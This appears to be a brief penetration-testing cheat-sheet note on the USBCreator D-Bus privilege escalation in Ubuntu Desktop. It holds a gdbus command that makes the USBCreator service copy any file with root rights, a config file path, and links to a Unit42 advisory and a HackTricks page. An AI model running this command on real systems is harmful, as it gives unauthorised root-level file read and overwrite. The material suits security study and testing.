# usbcreator

### USBCreator Privilege Escalation

d-bus command injection

```bash
# config file path
cat /etc/dbus-1/system.d/com.ubuntu.USBCreator.conf

https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/
# makes a copy of file
gdbus call --system --dest com.ubuntu.USBCreator --object-path /com/ubuntu/USBCreator --method com.ubuntu.USBCreator.Image 'FROM-FILE' 'TO-FILE' true

# py method didn't work
https://book.hacktricks.xyz/linux-unix/privilege-escalation/d-bus-enumeration-and-command-injection-privilege-escalation
```
